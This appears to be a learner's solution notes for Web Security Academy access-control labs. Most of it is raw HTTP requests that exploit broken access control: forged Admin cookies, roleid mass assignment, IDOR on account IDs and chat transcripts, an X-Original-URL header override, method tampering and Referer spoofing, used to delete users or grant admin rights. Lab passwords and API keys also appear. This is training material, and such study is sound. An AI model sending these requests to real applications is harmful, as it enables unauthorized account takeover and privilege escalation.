### Lab: Unprotected admin functionality

https://0a9300fe03192ceec1a17e56009b001f.web-security-academy.net/robots.txt

https://0a9300fe03192ceec1a17e56009b001f.web-security-academy.net/administrator-panel

### Unprotected admin functionality with unpredictable URL

view page source

view-source:https://0a22006f04a1bdf8c0480cda004300f7.web-security-academy.net/

### User role controlled by request parameter

GET /admin/delete?username=carlos HTTP/1.1
Host: 0a7200a9031f1a73c11fba7b002f0089.web-security-academy.net
Cookie: Admin=true; session=gkQy2FHmqjoP1cRKabO8FhMUYM3AW3PD
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7200a9031f1a73c11fba7b002f0089.web-security-academy.net/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

###

POST /my-account/change-email HTTP/1.1
Host: 0a1900ae048d590fc1664047002c0073.web-security-academy.net
Cookie: session=M40nQjvsgltslbKMjUsG82cDJMO7uXZZ
Content-Length: 54
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://0a1900ae048d590fc1664047002c0073.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1900ae048d590fc1664047002c0073.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{
  "email":"asdasdasdasd@asdasd.ocm",
  "roleid":2
}

HTTP/1.1 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 127

{
  "username": "wiener",
  "email": "asdasdasdasd@asdasd.ocm",
  "apikey": "m40yUOsRyLioB2wqwipwkyuSu8SHV5g3",
  "roleid": 2
}

### 

GET /my-account?id=carlos

eRodDFcKGmEE4uH8CRO9znsK7uqYgbvm

###

https://0ad500930490c483c0e55564005300e7.web-security-academy.net/post?postId=6

https://0ad500930490c483c0e55564005300e7.web-security-academy.net/my-account?id=197c4d94-4a1a-4c49-be0b-1ddc3a6cd56a

###

GET /my-account?id=carlos HTTP/1.1
Host: 0afb00c603871a7dc123d65300680073.web-security-academy.net
Cookie: session=y0JNXlFBfRSZqUNVQpD0QJheBIANYKxa
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afb00c603871a7dc123d65300680073.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

### User ID controlled by request parameter with password disclosure

https://0a82006803c743c3c0f91ee100750053.web-security-academy.net/my-account?id=administrator

mtlswn8mho698df7c4iv

### Insecure direct object references

Try to download transcript, we get 2.txt

Try again we get 3.txt

Try get 1.txt

view-source:https://0a47008903c58562c05ff9c700090052.web-security-academy.net/chat source code

https://0a47008903c58562c05ff9c700090052.web-security-academy.net/resources/js/viewTranscript.js

https://0a47008903c58562c05ff9c700090052.web-security-academy.net/download-transcript/1.txt

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is yv8tjead9aoo9qiooy6e. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!

### URL-based access control can be circumvented

GET /?username=carlos HTTP/1.1
Host: 0a9e006903867637c04bcaf500ce003e.web-security-academy.net
X-Original-URL: /admin/delete
Cookie: session=NEBYlGlegx59tpSdAgFjAt1plSTSObdX
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

### Method-based access control can be circumvented

POSTX /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: 0a0100310366cf98c07f18db008600fd.web-security-academy.net
Cookie: session=UNAUTHENTICATED-SESSION-COOKIE
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a0100310366cf98c07f18db008600fd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0100310366cf98c07f18db008600fd.web-security-academy.net/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=wiener&action=upgrade

GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: 0a0100310366cf98c07f18db008600fd.web-security-academy.net
Cookie: session=UNAUTHENTICATED-SESSION-COOKIE
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a0100310366cf98c07f18db008600fd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0100310366cf98c07f18db008600fd.web-security-academy.net/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=wiener&action=upgrade

### Multi-step process with no access control on one step

POST /admin-roles HTTP/1.1
Host: 0abe00a003b86d53c0ed945d003f008f.web-security-academy.net
Cookie: session=UNAUTHENTICATED-SESSION-COOKIE
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0abe00a003b86d53c0ed945d003f008f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abe00a003b86d53c0ed945d003f008f.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

action=upgrade&confirmed=true&username=wiener

### Referer-based access control

GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: 0a9b001403bc3f44c0e81b90000c000a.web-security-academy.net
Cookie: session=UNPRIVILEGED-SESSION-COOKIE # need to be logged in as wiener
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9b001403bc3f44c0e81b90000c000a.web-security-academy.net/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

